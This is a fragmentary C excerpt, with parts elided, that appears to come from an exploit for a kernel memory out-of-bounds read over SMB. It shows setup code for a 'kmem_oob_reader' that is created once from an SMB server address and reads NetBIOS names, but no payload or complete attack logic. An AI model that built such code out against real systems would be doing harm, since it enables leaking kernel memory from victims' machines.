...
static struct kmem_oob_reader* g_kmem_oob_reader;


struct kmem_oob_reader* kmem_oob_reader_create(const struct sockaddr_in* smb_addr) {
    struct kmem_oob_reader* reader = malloc(sizeof(struct kmem_oob_reader));
...
void kmem_oob_reader_read(const struct kmem_oob_reader_args* args, char* server_nb_name, uint32_t* server_nb_name_size, char* local_nb_name, uint32_t* local_nb_name_size) {
    ...
    dispatch_once(&g_kmem_oob_reader_token, ^{
        g_kmem_oob_reader = kmem_oob_reader_create(&args->smb_addr);
    });
